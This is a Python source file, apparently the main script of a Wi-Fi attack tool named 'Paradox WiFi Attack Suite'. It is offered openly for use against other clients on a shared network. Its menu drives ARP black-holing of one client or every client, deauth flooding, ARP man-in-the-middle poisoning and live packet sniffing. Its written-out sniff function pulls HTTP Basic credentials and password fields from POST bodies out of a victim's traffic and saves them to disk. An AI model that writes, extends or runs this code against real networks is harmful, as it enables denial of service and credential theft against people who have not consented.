#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Paradox WiFi Attack Suite v3.0
Connect to a Wi-Fi → discover clients → attack them or the AP.
Works on Linux / Kali / Termux (root).
"""

from __future__ import annotations

import os
import sys
import time
import threading
from typing import Optional

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from paradox.core import (
    console, require_root, get_default_iface, collect_network_info,
    print_network_info, arp_scan, print_hosts, select_host, scan_ports,
    arp_poison, arp_blackhole, mass_arp_blackhole, deauth_flood,
    setup_monitor_mode, Host, NetworkInfo, confirm, safe_int, VERSION,
)
from rich.prompt import Prompt

BANNER = rf"""
[bold red]
  ██╗    ██╗██╗███████╗██╗      ██████╗  █████╗ ██████╗ 
  ██║    ██║██║██╔════╝██║     ██╔═══██╗██╔══██╗██╔══██╗
  ██║ █╗ ██║██║█████╗  ██║     ██║   ██║███████║██║  ██║
  ██║███╗██║██║██╔══╝  ██║     ██║   ██║██╔══██║██║  ██║
  ╚███╔███╔╝██║██║     ██║     ╚██████╔╝██║  ██║██████╔╝
   ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═════╝
[/bold red]
[bold yellow]  PARADOX WIFI  |  v{VERSION}  |  Termux / Linux[/bold yellow]
[dim]  discover clients → kick / mitm / blackhole / deauth[/dim]
"""

MENU = """
[bold red]PARADOX WIFI[/bold red]

[bold yellow]DISCOVERY[/bold yellow]
  1  Scan network — find all clients
  2  Port scan a client
  3  Refresh network info

[bold yellow]KICK[/bold yellow]
  4  Mass kick — everyone except you (ARP black hole)
  5  Kick one client (ARP black hole)
  6  Deauth flood (needs monitor mode)
  7  Setup monitor mode

[bold yellow]MITM[/bold yellow]
  8  ARP MITM (single client)
  9  Live packet / credential sniff (post-MITM)

[bold yellow]TOOLS[/bold yellow]
  10 Environment check

  0  Exit
"""


def env_check(iface: str) -> None:
    console.print("[yellow][*] Environment check[/yellow]")
    import subprocess
    checks = [
        ("python3", ["python3", "--version"]),
        ("scapy", ["python3", "-c", "import scapy; print(scapy.__version__)"]),
        ("iw", ["iw", "--version"]),
        ("ip", ["ip", "-V"]),
    ]
    for name, cmd in checks:
        try:
            r = subprocess.run(cmd, capture_output=True, timeout=3, text=True)
            ok = r.returncode == 0 or bool(r.stdout or r.stderr)
            color = "green" if ok else "red"
            mark = "✓" if ok else "✗"
            console.print(f"  [{color}]{mark} {name}[/{color}]")
        except Exception:
            console.print(f"  [red]✗ {name}[/red]")
    root = hasattr(os, "geteuid") and os.geteuid() == 0
    color = "green" if root else "red"
    mark = "✓" if root else "✗"
    console.print(f"  [{color}]{mark} root[/{color}]")
    console.print(f"  [dim]iface={iface}[/dim]")


def sniff_client(victim_ip: str, iface: str, duration: int = 60) -> None:
    console.print(f"[bold red][*] Sniffing {victim_ip} for {duration}s[/bold red]")
    try:
        from scapy.all import sniff, IP, TCP, Raw, wrpcap
    except ImportError:
        console.print("[red]pip install scapy[/red]")
        return

    import base64
    import re as _re
    from pathlib import Path

    frames = []
    creds = []

    def _proc(pkt):
        frames.append(pkt)
        if not (pkt.haslayer(IP) and pkt.haslayer(TCP) and pkt.haslayer(Raw)):
            return
        if pkt[IP].src != victim_ip and pkt[IP].dst != victim_ip:
            return
        payload = pkt[Raw].load.decode("utf-8", errors="ignore")
        m = _re.search(r"Authorization: Basic (\S+)", payload, _re.I)
        if m:
            try:
                dec = base64.b64decode(m.group(1)).decode("utf-8", errors="ignore")
                line = f"[HTTP-BASIC] {dec}"
                creds.append(line)
                console.print(f"[bold green]   {line}[/bold green]")
            except Exception:
                pass
        if "POST " in payload and "\r\n\r\n" in payload:
            body = payload.split("\r\n\r\n", 1)[1]
            if any(k in body.lower() for k in ("password=", "passwd=", "pass=")):
                line = f"[HTTP-POST] {body[:180]}"
                creds.append(line)
                console.print(f"[bold green]   {line}[/bold green]")

    sniff(filter=f"host {victim_ip}", prn=_proc, iface=iface, timeout=duration, store=False)
    out = f"/tmp/paradox_sniff_{victim_ip.replace('.', '_')}.pcap"
    if frames:
        wrpcap(out, frames)
        console.print(f"[green][+] {len(frames)} packets → {out}[/green]")
    if creds:
        Path(out.replace(".pcap", "_creds.txt")).write_text("\n".join(creds))
        console.print(f"[green][+] {len(creds)} credentials saved[/green]")


def main() -> None:
    require_root()
    console.print(BANNER)

    iface = get_default_iface()
    iface = Prompt.ask("WiFi interface", default=iface).strip() or iface

    net = collect_network_info(iface)
    print_network_info(net)

    if not net.our_ip or not net.gateway_ip:
        console.print("[bold red][!] Not connected or no gateway. Connect to Wi-Fi first.[/bold red]")

    clients: list[Host] = []

    while True:
        console.print(MENU)
        choice = Prompt.ask("[bold cyan]wifi>[/bold cyan]", default="0").strip()

        if choice == "1":
            if not net.subnet_cidr:
                net = collect_network_info(iface)
            clients = arp_scan(net.subnet_cidr, iface)
            clients = [c for c in clients if c.ip != net.our_ip]
            print_hosts(clients, title=f"Clients on {net.ssid}")

        elif choice == "2":
            c = select_host(clients)
            if c:
                scan_ports(c)
                print_hosts([c])

        elif choice == "3":
            net = collect_network_info(iface)
            print_network_info(net)

        elif choice == "4":
            if not clients:
                console.print("[yellow]Run discovery (1) first.[/yellow]")
                if confirm("Discover now?", "y"):
                    clients = arp_scan(net.subnet_cidr, iface)
                    clients = [c for c in clients if c.ip != net.our_ip]
            if clients:
                targets = [c for c in clients if c.mac.lower() != (net.our_mac or "").lower()]
                console.print(f"[yellow]Targets: {len(targets)}[/yellow]")
                for c in targets:
                    console.print(f"  [dim]{c.ip}  {c.mac}  {c.vendor}[/dim]")
                if confirm(f"Mass black-hole {len(targets)} clients?"):
                    mass_arp_blackhole(targets, net.gateway_ip, iface)

        elif choice == "5":
            c = select_host(clients)
            if c:
                dur = safe_int(Prompt.ask("Duration sec (0=until Ctrl-C)", default="0"))
                arp_blackhole(c.ip, net.gateway_ip, iface, dur)

        elif choice == "6":
            bssid = net.bssid if net.bssid != "unknown" else Prompt.ask("AP BSSID")
            client = Prompt.ask("Client MAC (ff:ff:..=broadcast)", default="ff:ff:ff:ff:ff:ff")
            mon = setup_monitor_mode(iface) or iface
            deauth_flood(mon, bssid, client)

        elif choice == "7":
            mon = setup_monitor_mode(iface)
            if mon:
                console.print(f"[green]Monitor iface: {mon}[/green]")

        elif choice == "8":
            c = select_host(clients)
            if c:
                arp_poison(c.ip, net.gateway_ip, iface)

        elif choice == "9":
            c = select_host(clients)
            if c:
                dur = safe_int(Prompt.ask("Duration sec", default="60"), 60)
                sniff_client(c.ip, iface, dur)

        elif choice == "10":
            env_check(iface)

        elif choice == "0":
            console.print("[bold red]paradox wifi offline.[/bold red]")
            break
        else:
            console.print("[dim]unknown option[/dim]")


if __name__ == "__main__":
    main()
